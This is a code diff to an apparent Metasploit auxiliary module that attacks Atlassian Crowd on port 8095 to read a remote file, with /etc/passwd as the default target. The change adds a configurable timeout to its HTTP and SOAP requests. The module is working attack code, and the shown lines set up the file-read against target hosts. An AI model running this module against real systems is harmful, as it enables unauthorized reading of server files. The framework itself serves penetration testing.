@@ -41,20 +41,25 @@ class Metasploit4 < Msf::Auxiliary
     register_options(
     [
       Opt::RPORT(8095),
-      OptString.new('TARGETURI', [true, 'Path to Crowd', '/crowd/services']),
-      OptString.new('RFILE', [true, 'Remote File', '/etc/passwd'])
-
+      OptString.new('TARGETURI', [ true, 'Path to Crowd', '/crowd/services' ]),
+      OptString.new('RFILE', [ true, 'Remote File', '/etc/passwd' ]),
+      OptInt.new('TIMEOUT', [ false, "The timeout in seconds waiting for the server response", 60 ])
     ], self.class)
 
     register_autofilter_ports([ 8095 ])
     deregister_options('RHOST')
   end
 
+  def timeout
+    datastore['TIMEOUT'] || 60
+  end
+
   def run_host(ip)
     uri = normalize_uri(target_uri.path)
     res = send_request_cgi({
       'uri'     => uri,
-      'method'  => 'GET'})
+      'method'  => 'GET'
+    }, timeout)
 
     if not res
       print_error("#{rhost}:#{rport} Unable to connect")
@@ -123,7 +128,7 @@ class Metasploit4 < Msf::Auxiliary
         'data'     => data,
         'headers'  => {
           'SOAPAction'    => '""',
-        }}, 60)
+        }}, timeout)
 
     if res and res.code == 500
       case res.body
